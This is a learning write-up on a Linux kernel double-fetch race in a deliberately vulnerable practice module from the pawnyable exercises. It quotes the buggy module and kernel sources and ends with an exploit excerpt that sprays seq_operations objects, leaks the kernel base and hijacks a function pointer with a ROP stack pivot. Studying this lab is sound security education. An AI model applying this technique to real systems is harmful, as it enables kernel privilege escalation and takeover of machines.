# Double Fetch

Practice from [1].

[1] https://pawnyable.cafe/linux-kernel/LK03/double_fetch.html

## QEMU configuration

Note that this is a race-related bug, and requires running in multiple cores.
All security mitigations may be enabled.

## Double Fetch Vulnerability

From [1]:

Type of data race that occurs in kernel space. It refers to contention caused
by fetching (reading) the same data twice on the kernel side. When kernel space
reads the same data twice from user space, another thread may rewrite the data
in between. This causes the data content to differ between reads, resulting in
a loss of consistency.

The big difference with the race condition vulnerability (seen in
[LK01-4](https://github.com/cpey/pawnyable/blob/main/LK01-4)) is that this bug
cannot be dealt with by taking a mutex on the kernel side.


> Mitigation:
> When dealing with user space data multiple times, you have to copy the data on
> the first use to kernel space, which you will reuse in the subsequent accesses.

The double fetch vulnerability exists in 
[Dexter module](https://github.com/cpey/pawnyable/blob/main/LK03-1/src/Dexter_module/dexter.c),
since the `verify_request()` called at the beginning of the ioctl, copies from
the user memory the length of the request which is checked, and later, within
both ioctl commands this length is read from the user memory again.


~~~c
File: dexter.c

static long module_ioctl(struct file *filp,
                         unsigned int cmd,
                         unsigned long arg) {
  if (verify_request((void*)arg))
    return -EINVAL;

  switch (cmd) {
    case CMD_GET: return copy_data_to_user(filp, (void*)arg);
    case CMD_SET: return copy_data_from_user(filp, (void*)arg);
    default: return -EINVAL;
  }
}
~~~

~~~c
File: dexter.c

int verify_request(void *reqp) {
  request_t req;
  if (copy_from_user(&req, reqp, sizeof(request_t)))
    return -1;
  if (!req.ptr || req.len > BUFFER_SIZE)
    return -1;
  return 0;
}

long copy_data_to_user(struct file *filp, void *reqp) {
  request_t req;
  if (copy_from_user(&req, reqp, sizeof(request_t)))
    return -EINVAL;
  if (copy_to_user(req.ptr, filp->private_data, req.len))
    return -EINVAL;
  return 0;
}

long copy_data_from_user(struct file *filp, void *reqp) {
  request_t req;
  if (copy_from_user(&req, reqp, sizeof(request_t)))
    return -EINVAL;
  if (copy_from_user(filp->private_data, req.ptr, req.len))
    return -EINVAL;
  return 0;
}
~~~

- Find the implementaiton of a double fetch test in [src/02.dexter-test/dexter-test.c](https://github.com/cpey/pawnyable/blob/main/LK03-1/src/02.dexter-test/dexter-test.c),

## struct seq_operations

Since the area that can be destroyed this time is of size 0x20, it belongs to
kmalloc-32. Therefore, it is necessary to find a victim object that is
allocated in the same slab size. `seq_operations` structure is such an option.

`seq_operations` is a structure that describes the handlers called by the
kernel when reading special files like sysfs, debugfs, and procfs, from user
space.  Therefore, it can be created by opening a special file such as
/proc/self/stat. Since it is has in it a bunch of function pointers, it can be
used to leak the address of the kernel.

~~~c
File: /include/linux/seq_file.h

struct seq_operations {
    void * (*start) (struct seq_file *m, loff_t *pos);
    void (*stop) (struct seq_file *m, void *v);
    void * (*next) (struct seq_file *m, void *v, loff_t *pos);
    int (*show) (struct seq_file *m, void *v);
};
~~~

Note that in addition to the `seq_operations` structure, the structure
`file_operations` -- defined in include/linux/fs.h --, is created on every
opened file as well, although the `file_operations` is a much larger structure,
of size 256 bytes, and therefore not polluting our slab.

## /proc/self/stat

The `stat` file is defined in /fs/proc/base.c, 

~~~c
File: /fs/proc/base.c, 

static const struct pid_entry tid_base_stuff[] = {
...
  ONE("stat",      S_IRUGO, proc_tid_stat),
...
}
~~~

where the macro ONE is defined as 

~~~c
File: /fs/proc/base.c, 

#define NOD(NAME, MODE, IOP, FOP, OP) {            \
   .name = (NAME),                 \
   .len  = sizeof(NAME) - 1,           \
   .mode = MODE,                   \
   .iop  = IOP,                    \
   .fop  = FOP,                    \
   .op   = OP,                 \
}

#define ONE(NAME, MODE, show)              \
   NOD(NAME, (S_IFREG|(MODE)),         \
       NULL, &proc_single_file_operations, \
       { .proc_show = show } )
~~~

and `pid_entry`:

~~~c
File: /fs/proc/base.c

struct pid_entry {
   const char *name;
   unsigned int len;
   umode_t mode;
   const struct inode_operations *iop;
   const struct file_operations *fop;
   union proc_op op;
};
~~~

Therefore, `stat`'s file_operations structure is `proc_single_file_operations`, defined as:

~~~c
File: /fs/proc/base.c

static const struct file_operations proc_single_file_operations = {
   .open       = proc_single_open,
   .read       = seq_read,
   .llseek     = seq_lseek,
   .release    = single_release,
};
~~~

When the file is opened, `proc_single_open` is called:

~~~c
File: /fs/proc/base.c

static int proc_single_open(struct inode *inode, struct file *filp)
{
   return single_open(filp, proc_single_show, inode);
}
~~~

`single_open` is defined in /fs/seq_file.c, which allocates and initializes the
`seq_operations` structure:

~~~c
File: /fs/seq_file.c

int single_open(struct file *file, int (*show)(struct seq_file *, void *),
       void *data)
{
   struct seq_operations *op = kmalloc(sizeof(*op), GFP_KERNEL_ACCOUNT);
   int res = -ENOMEM;

   if (op) {
       op->start = single_start;
       op->next = single_next;
       op->stop = single_stop;
       op->show = show;
       res = seq_open(file, op);
       if (!res)
           ((struct seq_file *)file->private_data)->private = data;
       else
           kfree(op);
   }
   return res;
}
~~~

## Exploitation

The goal is to have a victim object `seq_operations` placed right after the
vulnerable buffer, and by using the out-of-bounds read, read its first pointer
`void * (*start) (struct seq_file *m, loff_t *pos)` and use its value to leak
the kernel base address. Then, replace the same pointer with the rop gadget
pivoting the stack, and finally execute the gadget by calling `read()`:

~~~c
  // Spray `seq_operations` around the Dexter buffer
  int spray[0x100];
  for (int i = 0; i < 0x80; i++)
    spray[i] = open("/proc/self/stat", O_RDONLY);
  fd = open("/dev/dexter", O_RDWR);
  if (fd == -1) fatal("/dev/dexter");
  for (int i = 0x80; i < 0x100; i++)
    spray[i] = open("/proc/self/stat", O_RDONLY);
  char buf[0x40];
  overread(buf, 0x40);
  kbase = *(unsigned long*)&buf[0x20] - ofs_seq_start;
  printf("[+] kbase = 0x%016lx\n", kbase);
...
  // RIP control
  *(unsigned long*)&buf[0x20] = rop_mov_esp_39000000h;
  overwrite(buf, 0x28);

  // Trigger the exploit
  for (int i = 0; i < 0x100; i++) {
    read(spray[i], buf, 1);
  }
~~~

Full implementation in: [src/04.dexter-krop/dexter-krop.c](https://github.com/cpey/pawnyable/blob/main/LK03-1/src/04.dexter-krop/dexter-krop.c)
